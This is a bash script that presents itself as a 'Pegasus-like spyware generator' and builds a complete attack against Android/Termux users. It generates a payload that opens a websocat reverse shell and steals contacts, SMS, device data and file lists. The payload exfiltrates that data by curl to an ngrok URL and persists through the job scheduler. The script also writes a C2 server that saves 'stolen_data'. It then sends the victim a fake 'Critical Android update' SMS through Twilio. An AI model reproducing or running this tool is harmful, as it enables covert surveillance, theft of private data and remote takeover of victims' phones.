#!/bin/bash

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m'

# ASCII Art
echo -e "${RED}
   ____ ___  ____ ___  ____  
  |  _ \\___ | __ )___/ ___| 
 | |_) |__ |  _ \\___ \\___ \\ 
${GREEN}
 |  __/ __|| |_) |__) |__) |
 |_|   \\___|____/____/____/
${YELLOW}
"

echo -e "${GREEN}[*] DUDE's Pegasus-Like Spyware Generator & Delivery${NC}"
echo -e "${YELLOW}Creating and sending payload...${NC}"

# Inputs
read -p "${YELLOW}[?] Enter target phone number (e.g., +1234567890): ${NC}" phone_number
read -p "${YELLOW}[?] Enter ngrok HTTP URL (e.g., http://abc123.ngrok-free.app): ${NC}" ngrok_http
read -p "${YELLOW}[?] Enter reverse shell IP (e.g., 192.168.1.100): ${NC}" reverse_ip
read -p "${YELLOW}[?] Enter reverse shell port (e.g., 4444): ${NC}" reverse_port
read -p "${YELLOW}[?] Enter Twilio SID: ${NC}" twilio_sid
read -p "${YELLOW}[?] Enter Twilio Auth Token: ${NC}" twilio_token
read -p "${YELLOW}[?] Enter Twilio Phone Number (e.g., +0987654321): ${NC}" twilio_phone
read -p "${YELLOW}[?] Enter URL shortener API key (e.g., Bitly, optional, press Enter to skip): ${NC}" shortener_api

# Validate inputs
if [[ ! "$ngrok_http" =~ ^http ]]; then
    echo -e "${RED}[-] Invalid URL. Must start with http:// or https://${NC}"
    exit 1
fi
if [[ ! "$ngrok_http" =~ /upload$ ]]; then
    if [[ ! "$ngrok_http" =~ /$ ]]; then
        ngrok_http="${ngrok_http}/"
    fi
    ngrok_http="${ngrok_http}upload"
fi
if [[ ! "$phone_number" =~ ^\+[0-9]+$ ]]; then
    echo -e "${RED}[-] Invalid phone number. Use format +1234567890${NC}"
    exit 1
fi
if ! [[ "$reverse_port" =~ ^[0-9]+$ ]] || [ "$reverse_port" -lt 1 ] || [ "$reverse_port" -gt 65535 ]; then
    echo -e "${RED}[-] Invalid port. Use 1-65535${NC}"
    exit 1
fi

# Directories
SPYWARE_DIR="/tmp/.pegasus_core"
mkdir -p "$SPYWARE_DIR"
PAYLOAD_PATH="$SPYWARE_DIR/payload.sh"
ERROR_LOG="$SPYWARE_DIR/error.log"
CURL_LOG="$SPYWARE_DIR/curl_debug.log"

# Generate payload
echo -e "${YELLOW}[*] Generating payload...${NC}"
ws_url="${ngrok_http//http:/ws:}"
ws_url="${ws_url//upload/shell}"
cat << EOF > "$PAYLOAD_PATH"
#!/bin/bash
# Pegasus-like spyware payload by DUDE

# Install websocat
pkg install -y websocat 2>/dev/null || apt install -y websocat 2>/dev/null

# HTTP reverse shell
for i in {1..3}; do
    websocat $ws_url --exec /bin/sh &
    sleep 2
    if pgrep websocat >/dev/null; then
        break
    fi
done

# Data theft
mkdir -p /data/data/com.termux/files/home/.spyware_core
echo "Device: \$(getprop ro.product.model)" > /data/data/com.termux/files/home/.spyware_core/device_info.txt
echo "Android Version: \$(getprop ro.build.version.release)" >> /data/data/com.termux/files/home/.spyware_core/device_info.txt
termux-telephony-deviceinfo 2>/dev/null | grep device_id >> /data/data/com.termux/files/home/.spyware_core/device_info.txt
whoami >> /data/data/com.termux/files/home/.spyware_core/device_info.txt
date >> /data/data/com.termux/files/home/.spyware_core/device_info.txt
ip addr > /data/data/com.termux/files/home/.spyware_core/network_info.txt
termux-contact-list 2>/dev/null > /data/data/com.termux/files/home/.spyware_core/contacts.txt
termux-sms-list -l 100 2>/dev/null > /data/data/com.termux/files/home/.spyware_core/sms.txt
find /sdcard -type f -name "*.jpg" -o -name "*.png" -o -name "*.pdf" -o -name "*.txt" -maxdepth 3 > /data/data/com.termux/files/home/.spyware_core/files.txt

# Exfiltrate
for file in /data/data/com.termux/files/home/.spyware_core/*.txt; do
    if [ -f "\$file" ]; then
        base64 "\$file" > /data/data/com.termux/files/home/.spyware_core/.tmp
        curl -s -X POST -F "file=@/data/data/com.termux/files/home/.spyware_core/.tmp" -F "name=\$(basename \$file)" $ngrok_http
        rm /data/data/com.termux/files/home/.spyware_core/.tmp
    fi
done

# Persistence
echo "bash \$0 &>/dev/null" > /data/data/com.termux/files/home/.spyware_core/run.sh
chmod 700 /data/data/com.termux/files/home/.spyware_core/run.sh
termux-job-scheduler -s /data/data/com.termux/files/home/.spyware_core/run.sh -p 180
EOF

chmod 700 "$PAYLOAD_PATH"
echo -e "${GREEN}[+] Payload generated at $PAYLOAD_PATH${NC}"

# Start C2 server
echo -e "${YELLOW}[*] Starting C2 server...${NC}"
cat << EOF > c2_server.py
from http.server import HTTPServer, BaseHTTPRequestHandler
import cgi
import os
import datetime
import websocket
import threading

class C2Handler(BaseHTTPRequestHandler):
    def do_POST(self):
        try:
            if self.path == '/upload':
                form = cgi.FieldStorage(
                    fp=self.rfile,
                    headers=self.headers,
                    environ={'REQUEST_METHOD': 'POST'}
                )
                file_item = form['file']
                filename = form['name'].value
                os.makedirs('stolen_data', exist_ok=True)
                timestamp = datetime.datetime.now().strftime('%Y%m%d_%H%M%S')
                save_path = f"stolen_data/{timestamp}_{filename}"
                with open(save_path, 'wb') as f:
                    f.write(file_item.file.read())
                os.system(f"base64 -d {save_path} > {save_path}.decoded")
                self.send_response(200)
                self.send_header('Content-type', 'text/plain')
                self.end_headers()
                self.wfile.write(b"Data received, yo!")
            elif self.path == '/payload':
                form = cgi.FieldStorage(
                    fp=self.rfile,
                    headers=self.headers,
                    environ={'REQUEST_METHOD': 'POST'}
                )
                file_item = form['file']
                os.makedirs('payloads', exist_ok=True)
                save_path = f"payloads/payload.sh"
                with open(save_path, 'wb') as f:
                    f.write(file_item.file.read())
                payload_url = f"http://{self.headers['Host']}/payloads/payload.sh"
                self.send_response(200)
                self.send_header('Content-type', 'text/plain')
                self.end_headers()
                self.wfile.write(payload_url.encode())
        except Exception as e:
            self.send_response(500)
            self.end_headers()
            self.wfile.write(f"Error: {str(e)}".encode())

    def do_GET(self):
        if self.path == '/':
            self.send_response(200)
            self.send_header('Content-type', 'text/plain')
            self.end_headers()
            self.wfile.write(b"C2 server alive!")
        elif self.path.startswith('/payloads/'):
            file_path = self.path[1:]
            if os.path.exists(file_path):
                self.send_response(200)
                self.send_header('Content-type', 'application/x-sh')
                self.end_headers()
                with open(file_path, 'rb') as f:
                    self.wfile.write(f.read())
            else:
                self.send_response(404)
                self.end_headers()

def run_websocket_server():
    def on_message(ws, message):
        print(f"[Shell] {message}")
        ws.send(input("\$ "))

    def on_error(ws, error):
        print(f"[WebSocket Error] {error}")

    def on_close(ws, _, __):
        print("[WebSocket] Connection closed")

    def on_open(ws):
        print("[WebSocket] Connection opened")
        ws.send("Connected to shell")

    websocket.enableTrace(True)
    ws = websocket.WebSocketApp("ws://$reverse_ip:$reverse_port/shell",
                                on_message=on_message,
                                on_error=on_error,
                                on_close=on_close)
    ws.on_open = on_open
    ws.run_forever()

def run_server():
    server_address = ('0.0.0.0', 8080)
    httpd = HTTPServer(server_address, C2Handler)
    print("C2 server running on port 8080...")
    threading.Thread(target=run_websocket_server, daemon=True).start()
    httpd.serve_forever()

if __name__ == '__main__':
    run_server()
EOF

pkill -f c2_server.py
python3 c2_server.py &
sleep 3

# Test ngrok HTTP
echo -e "${YELLOW}[*] Testing ngrok HTTP server...${NC}"
for attempt in {1..3}; do
    if curl -s --head "${ngrok_http//upload/}" -o "$CURL_LOG" 2>&1 | grep "200 OK" >/dev/null; then
        echo -e "${GREEN}[+] Ngrok HTTP server alive${NC}"
        break
    else
        echo -e "${YELLOW}[!] Attempt $attempt/3 failed. Retrying...${NC}"
        sleep 2
    fi
done
if ! grep "200 OK" "$CURL_LOG" >/dev/null; then
    echo -e "${RED}[-] Ngrok HTTP server down. Check $CURL_LOG.${NC}"
    exit 1
fi

# Test reverse shell connectivity
echo -e "${YELLOW}[*] Testing reverse shell connectivity to $reverse_ip:$reverse_port...${NC}"
if nc -z -w 5 "$reverse_ip" "$reverse_port" 2>/dev/null; then
    echo -e "${GREEN}[+] Reverse shell port open${NC}"
else
    echo -e "${RED}[-] Cannot connect to $reverse_ip:$reverse_port. Start listener and check firewall.${NC}"
    exit 1
fi

# Upload payload
echo -e "${YELLOW}[*] Uploading payload...${NC}"
for attempt in {1..3}; do
    response=$(curl -s -X POST -F "file=@$PAYLOAD_PATH" -F "name=payload.sh" "${ngrok_http//upload/payload}" -o "$CURL_LOG" 2>&1)
    if [[ "$response" =~ ^http ]]; then
        payload_url="$response"
        echo -e "${GREEN}[+] Payload uploaded, URL: $payload_url${NC}"
        break
    else
        echo -e "${YELLOW}[!] Attempt $attempt/3 failed. Retrying...${NC}"
        sleep 2
    fi
done
if [[ ! "$payload_url" =~ ^http ]]; then
    echo -e "${RED}[-] Payload upload failed. Check $CURL_LOG.${NC}"
    exit 1
fi

# Shorten URL (optional)
if [ -n "$shortener_api" ]; then
    echo -e "${YELLOW}[*] Shortening URL...${NC}"
    short_url=$(curl -s -H "Authorization: Bearer $shortener_api" \
        -H "Content-Type: application/json" \
        -X POST -d "{\"long_url\": \"$payload_url\"}" \
        https://api-ssl.bitly.com/v4/shorten | grep -o '"link":"[^"]*"' | cut -d'"' -f4)
    if [[ "$short_url" =~ ^http ]]; then
        payload_url="$short_url"
        echo -e "${GREEN}[+] Shortened URL: $payload_url${NC}"
    else
        echo -e "${YELLOW}[!] URL shortening failed, using original URL${NC}"
    fi
fi

# Send SMS
echo -e "${YELLOW}[*] Sending SMS to $phone_number...${NC}"
for attempt in {1..3}; do
    python3 << EOF > "$ERROR_LOG" 2>&1
from twilio.rest import Client
try:
    client = Client("$twilio_sid", "$twilio_token")
    message = client.messages.create(
        body="Critical Android update: $payload_url Install Termux from F-Droid, then run: bash payload.sh",
        from_="$twilio_phone",
        to="$phone_number"
    )
    print("SMS sent")
except Exception as e:
    print(f"SMS failed: {e}")
EOF
    if grep "SMS sent" "$ERROR_LOG" >/dev/null; then
        echo -e "${GREEN}[+] SMS sent to $phone_number${NC}"
        break
    else
        echo -e "${YELLOW}[!] Attempt $attempt/3 failed. Retrying...${NC}"
        sleep 2
    fi
done
if ! grep "SMS sent" "$ERROR_LOG" >/dev/null; then
    echo -e "${RED}[-] SMS failed. Check $ERROR_LOG.${NC}"
    exit 1
fi

echo -e "${GREEN}[+] Setup complete. Monitor WebSocket for shell at ws://$reverse_ip:$reverse_port/shell${NC}"
